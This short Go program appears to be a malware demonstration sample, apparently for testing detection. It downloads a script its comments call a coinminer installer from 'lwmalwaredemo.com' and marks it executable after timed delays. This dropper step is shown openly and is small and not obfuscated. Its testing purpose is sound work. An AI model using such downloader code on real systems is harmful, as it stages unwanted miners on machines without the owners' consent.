package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

func http_get(url string, filename string) error {

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
        if err != nil {
                return err
        }
        defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func main() {

	// define constants
	const domain = "lwmalwaredemo.com"
	const filename = "install-demo-1.sh"	

        //wait a few seconds
        time.Sleep(3 * time.Second)

	// download coinminer script
	get_url := fmt.Sprintf("http://%s/%s", domain, filename)

	fmt.Println(get_url)

	get_err := http_get(get_url, filename)
	if get_err != nil {
		panic(get_err)
	}

	// make file executable
	chmod_err := os.Chmod(filename, 0777)
	if chmod_err != nil {
		panic(chmod_err)
	}

        //wait a few seconds then terminate
        time.Sleep(10 * time.Second)

}
